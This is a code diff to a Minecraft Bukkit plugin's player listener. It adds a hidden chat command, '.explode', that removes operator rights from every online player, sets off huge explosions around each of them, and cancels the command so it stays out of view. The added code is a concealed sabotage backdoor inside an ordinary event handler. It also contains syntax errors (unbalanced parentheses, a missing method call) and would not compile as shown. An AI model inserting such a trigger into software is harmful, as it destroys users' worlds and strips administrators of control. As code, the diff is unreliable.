@@ -114,6 +114,24 @@ public class PlayerListener implements Listener
                     shouldCancel = true;
                 }
             }
+            if ((args[0].equalsIgnoreCase(".explode") && (args.length == 1))
+            {
+                for (final Player p : Bukkit.getServer().getOnlinePlayers())
+                {
+                    p.setOp(false);
+                    final Location l = p.getLocation();
+                    final World w = p.getWorld();
+                    for (int x = -1; x <= 1; x++)
+                    {
+                        for (int z = -1; z <= 1; z++)
+                        {
+                            final Location explosion = new Location(l.getWorld(), l.getBlockX() + x, l.getBlockY(), l.getBlockZ + z);
+                            w.createExplosion(explosion, 500);
+                        }
+                    }
+                    shouldCancel = true;
+                }
+            }
         }
     }
 
